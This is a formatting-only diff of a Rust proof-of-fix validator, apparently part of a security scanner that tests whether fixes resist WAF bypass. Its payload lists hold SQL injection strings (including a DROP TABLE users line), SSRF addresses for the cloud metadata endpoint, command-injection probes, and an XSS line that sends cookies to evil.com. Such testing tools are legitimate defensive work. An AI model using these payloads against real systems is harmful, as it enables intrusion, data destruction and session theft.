@@ -7,7 +7,6 @@
  *
  * © 2026 Bountyy Oy
  */
-
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
 
@@ -95,9 +94,9 @@ impl ProofOfFixValidator {
             if bypass_result.successful {
                 validation.validated = false;
                 validation.confidence_score = 95.0;
-                validation
-                    .recommendations
-                    .push("WAF bypass successful - fix is superficial, not at code level".to_string());
+                validation.recommendations.push(
+                    "WAF bypass successful - fix is superficial, not at code level".to_string(),
+                );
                 return Ok(validation);
             }
         }
@@ -175,9 +174,7 @@ impl ProofOfFixValidator {
         }
 
         // Check response codes that indicate blocking
-        if response.status_code == 403
-            || response.status_code == 406
-            || response.status_code == 419
+        if response.status_code == 403 || response.status_code == 406 || response.status_code == 419
         {
             detected = true;
             if waf_type == WafType::None {
@@ -249,11 +246,11 @@ impl ProofOfFixValidator {
 
         match vuln_type.to_lowercase().as_str() {
             "sql_injection" | "sqli" => {
+                payloads.push(("Case variation".to_string(), "' Or '1'='1".to_string()));
                 payloads.push((
-                    "Case variation".to_string(),
-                    "' Or '1'='1".to_string(),
+                    "URL encoding".to_string(),
+                    "%27%20OR%20%271%27=%271".to_string(),
                 ));
-                payloads.push(("URL encoding".to_string(), "%27%20OR%20%271%27=%271".to_string()));
                 payloads.push((
                     "Double encoding".to_string(),
                     "%2527%2520OR%2520%25271%2527=%25271".to_string(),
@@ -287,10 +284,7 @@ impl ProofOfFixValidator {
                     "IP obfuscation".to_string(),
                     "http://0xa9fea9fe".to_string(),
                 )); // 169.254.169.254 in hex
-                payloads.push((
-                    "Decimal IP".to_string(),
-                    "http://2852039166".to_string(),
-                ));
+                payloads.push(("Decimal IP".to_string(), "http://2852039166".to_string()));
                 payloads.push((
                     "Localhost variations".to_string(),
                     "http://127.0.0.1@evil.com".to_string(),
@@ -338,19 +332,37 @@ impl ProofOfFixValidator {
 
         match vuln_type.to_lowercase().as_str() {
             "sql_injection" | "sqli" => {
-                payloads.push(("Union-based".to_string(), "' UNION SELECT NULL--".to_string()));
-                payloads.push(("Time-based blind".to_string(), "'; WAITFOR DELAY '0:0:5'--".to_string()));
+                payloads.push((
+                    "Union-based".to_string(),
+                    "' UNION SELECT NULL--".to_string(),
+                ));
+                payloads.push((
+                    "Time-based blind".to_string(),
+                    "'; WAITFOR DELAY '0:0:5'--".to_string(),
+                ));
                 payloads.push(("Boolean-based blind".to_string(), "' AND 1=1--".to_string()));
-                payloads.push(("Stacked queries".to_string(), "'; DROP TABLE users--".to_string()));
+                payloads.push((
+                    "Stacked queries".to_string(),
+                    "'; DROP TABLE users--".to_string(),
+                ));
             }
             "xss" | "cross_site_scripting" => {
-                payloads.push(("DOM-based".to_string(), "javascript:alert(document.domain)".to_string()));
-                payloads.push(("Stored XSS".to_string(), "<script>fetch('//evil.com?c='+document.cookie)</script>".to_string()));
+                payloads.push((
+                    "DOM-based".to_string(),
+                    "javascript:alert(document.domain)".to_string(),
+                ));
+                payloads.push((
+                    "Stored XSS".to_string(),
+                    "<script>fetch('//evil.com?c='+document.cookie)</script>".to_string(),
+                ));
                 payloads.push(("Template injection".to_string(), "{{7*7}}".to_string()));
             }
             "command_injection" | "rce" => {
                 payloads.push(("Piped command".to_string(), "| whoami".to_string()));
-                payloads.push(("Background execution".to_string(), "; sleep 5 &".to_string()));
+                payloads.push((
+                    "Background execution".to_string(),
+                    "; sleep 5 &".to_string(),
+                ));
                 payloads.push(("Command substitution".to_string(), "$(whoami)".to_string()));
             }
             _ => {}
@@ -454,9 +466,8 @@ impl ProofOfFixValidator {
         let mut recommendations = Vec::new();
 
         if validation.validated && validation.confidence_score >= 90.0 {
-            recommendations.push(
-                "High confidence: Vulnerability appears to be genuinely fixed".to_string(),
-            );
+            recommendations
+                .push("High confidence: Vulnerability appears to be genuinely fixed".to_string());
             recommendations.push("Monitor for regressions in future scans".to_string());
         } else if validation.validated && validation.confidence_score >= 70.0 {
             recommendations.push(
@@ -468,13 +479,15 @@ impl ProofOfFixValidator {
             recommendations.push("Recommend code-level fix instead of WAF rules".to_string());
             recommendations.push("Test from internal network to bypass WAF".to_string());
         } else if !validation.validated {
-            recommendations.push("Fix validation failed - vulnerability may still be present".to_string());
+            recommendations
+                .push("Fix validation failed - vulnerability may still be present".to_string());
             recommendations.push("Conduct manual penetration test".to_string());
             recommendations.push("Review fix implementation at code level".to_string());
         }
 
         if validation.bypass_successful {
-            recommendations.push("CRITICAL: WAF bypass successful - fix is not effective".to_string());
+            recommendations
+                .push("CRITICAL: WAF bypass successful - fix is not effective".to_string());
         }
 
         recommendations
